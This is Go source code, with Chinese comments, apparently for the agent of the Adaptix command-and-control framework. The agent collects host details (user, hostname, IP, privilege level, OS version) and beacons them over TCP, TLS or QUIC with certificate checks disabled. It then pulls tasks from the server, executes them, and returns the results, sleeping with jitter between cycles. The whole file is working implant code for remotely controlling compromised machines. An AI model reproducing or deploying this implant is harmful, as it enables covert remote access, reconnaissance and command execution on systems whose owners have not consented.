package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"gopher/functions"
	"gopher/utils"
	mrand "math/rand"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	"github.com/quic-go/quic-go"
	"github.com/vmihailenco/msgpack/v5"
)

var ACTIVE = true

// DEBUG_NO_ENCRYPT 调试模式：禁用加密
// const DEBUG_NO_ENCRYPT = true

func CreateInfo() ([]byte, []byte) {
	var (
		addr     []net.Addr
		username string
		ip       string
	)

	path, err := os.Executable()
	if err == nil {
		path = filepath.Base(path)
	}

	userCurrent, err := user.Current()
	if err == nil {
		username = userCurrent.Username
	}

	host, _ := os.Hostname()

	osVersion, _ := functions.GetOsVersion()

	addr, err = net.InterfaceAddrs()
	if err == nil {
		for _, a := range addr {
			ipnet, ok := a.(*net.IPNet)
			if ok && !ipnet.IP.IsLoopback() && !ipnet.IP.IsLinkLocalUnicast() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}

	acp, oemcp := functions.GetCP()

	randKey := make([]byte, 16)
	_, _ = rand.Read(randKey)

	info := utils.SessionInfo{
		Process:    path,
		PID:        os.Getpid(),
		User:       username,
		Host:       host,
		Ipaddr:     ip,
		Elevated:   functions.IsElevated(),
		Acp:        acp,
		Oem:        oemcp,
		Os:         runtime.GOOS,
		OSVersion:  osVersion,
		EncryptKey: randKey,
	}

	data, _ := msgpack.Marshal(info)

	return data, randKey
}

var profile utils.Profile
var AgentId uint32
var encKey []byte

func main() {

	encKey = encProfile[:16]
	encProfile = encProfile[16:]
	// encProfile, _ = utils.DecryptData(encProfile, encKey)

	err := msgpack.Unmarshal(encProfile, &profile)
	if err != nil {
		return
	}

	sessionInfo, sessionKey := CreateInfo()

	// QUIC协议需要特殊处理：在 sessionInfo 中使用配置密钥
	if profile.Protocol == "quic" {
		// 反序列化 sessionInfo
		var info utils.SessionInfo
		_ = msgpack.Unmarshal(sessionInfo, &info)
		// 修改 EncryptKey 为配置密钥
		info.EncryptKey = encKey
		// 重新序列化
		sessionInfo, _ = msgpack.Marshal(info)
		// QUIC 模式下使用配置密钥作为 sessionKey
		sessionKey = encKey
	}

	// QUIC协议使用配置密钥，TCP协议使用会话密钥
	if profile.Protocol == "quic" {
		utils.SKey = encKey
	} else {
		utils.SKey = sessionKey
	}

	r := make([]byte, 4)
	_, _ = rand.Read(r)
	AgentId = binary.BigEndian.Uint32(r)

	initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
	// 调试模式：禁用加密
	// if !DEBUG_NO_ENCRYPT {
	// 	initMsg, _ = utils.EncryptData(initMsg, encKey)
	// }

	UPLOADS = make(map[string][]byte)
	DOWNLOADS = make(map[string]utils.Connection)
	JOBS = make(map[string]utils.Connection)

	addrIndex := 0
	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
			addrIndex = (addrIndex + 1) % len(profile.Addresses)
		}

		///// Connect

		var (
			err      error
			conn     net.Conn
			session  quic.Connection
			stream   quic.Stream
			streamMu sync.Mutex // 保护流的并发访问
		)

		if profile.Protocol == "quic" {
			// QUIC connection - 参考 Merlin 的配置
			tlsConf := &tls.Config{
				InsecureSkipVerify: true,
				NextProtos:         []string{"adaptix-quic"},
				MinVersion:         tls.VersionTLS12,
			}

			quicConf := &quic.Config{
				// MaxIdleTimeout: 30 秒超时
				MaxIdleTimeout: 30 * time.Second,
				// KeepAlivePeriod: 30 秒发送 PING 保持连接
				KeepAlivePeriod: 30 * time.Second,
				// HandshakeIdleTimeout: 握手超时
				HandshakeIdleTimeout: 30 * time.Second,
			}

			session, err = quic.DialAddr(context.Background(), profile.Addresses[addrIndex], tlsConf, quicConf)
			if err != nil {
				continue
			}

			// 打开单个流用于初始化
			stream, err = session.OpenStreamSync(context.Background())
			if err != nil {
				session.CloseWithError(0, "failed to open stream")
				continue
			}

			// 包装为 net.Conn 接口
			conn = &functions.QUICStreamConn{Stream: stream, Session: session}

		} else if profile.UseSSL {
			// TCP with SSL/TLS
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)

		} else {
			// TCP without SSL
			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
		}

		if err != nil {
			continue
		} else {
			i = 0
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				if session != nil {
					session.CloseWithError(0, "banner read failed")
				}
				continue
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, initMsg)

		/// Recv Command - 主通信循环

		var (
			inMessage  utils.Message
			outMessage utils.Message
			recvData   []byte
			sendData   []byte
		)

		// 根据协议选择加密密钥
		// var cryptKey []byte
		// if profile.Protocol == "quic" {
		// 	cryptKey = encKey // QUIC使用配置文件密钥（与Server端一致）
		// } else {
		// 	cryptKey = sessionKey // TCP继续使用会话密钥
		// }

		// 主通信循环 - 确保命令执行的可靠性
		for ACTIVE {
			// 接收命令
			recvData, err = functions.RecvMsg(conn)
			if err != nil {
				// 错误处理 - 对于 QUIC，关闭当前流并重新连接
				if profile.Protocol == "quic" && session != nil {
					// QUIC 支持连接迁移和多路复用
					// 尝试在同一会话上打开新流
					streamMu.Lock()
					newStream, streamErr := session.OpenStreamSync(context.Background())
					streamMu.Unlock()

					if streamErr == nil {
						// 成功打开新流，更新连接
						stream.Close()
						stream = newStream
						conn = &functions.QUICStreamConn{Stream: stream, Session: session}
						// 重试接收
						continue
					}
				}
				// 如果是 TCP 或 QUIC 会话失败，退出循环重新连接
				break
			}

				outMessage = utils.Message{Type: 0}
			// 调试模式：禁用解密
			// if !DEBUG_NO_ENCRYPT {
			// 	recvData, err = utils.DecryptData(recvData, cryptKey)
			// 	if err != nil {
			// 		break
			// 	}
			// }

				err = msgpack.Unmarshal(recvData, &inMessage)
			if err != nil {
				break
			}

			if inMessage.Type == 1 {
				outMessage.Type = 1
				// 执行命令
				outMessage.Object = TaskProcess(inMessage.Object)
			}

			// 发送响应
			sendData, _ = msgpack.Marshal(outMessage)
			// 调试模式：禁用加密
			// if !DEBUG_NO_ENCRYPT {
			// 	sendData, _ = utils.EncryptData(sendData, cryptKey)
			// }

			err = functions.SendMsg(conn, sendData)
			if err != nil {
				// 发送失败处理
				if profile.Protocol == "quic" && session != nil {
					// 尝试在新流上重新发送
					streamMu.Lock()
					newStream, streamErr := session.OpenStreamSync(context.Background())
					streamMu.Unlock()

					if streamErr == nil {
						stream.Close()
						stream = newStream
						conn = &functions.QUICStreamConn{Stream: stream, Session: session}
						// 重试发送
						_ = functions.SendMsg(conn, sendData)
					}
				}
				break
			}

			if profile.Sleep > 0 {
				sleepDuration := time.Duration(profile.Sleep) * time.Second
				if profile.Jitter > 0 {
					jitter := time.Duration(mrand.Intn(profile.Jitter)) * (sleepDuration / 100)
					if mrand.Intn(2) == 0 {
						sleepDuration += jitter
					} else {
						sleepDuration -= jitter
					}
				}
				time.Sleep(sleepDuration)
			}
		}

		// 清理连接
		if profile.Protocol == "quic" {
			if stream != nil {
				stream.Close()
			}
			if session != nil {
				session.CloseWithError(0, "disconnecting")
			}
		} else {
			conn.Close()
		}
	}
}
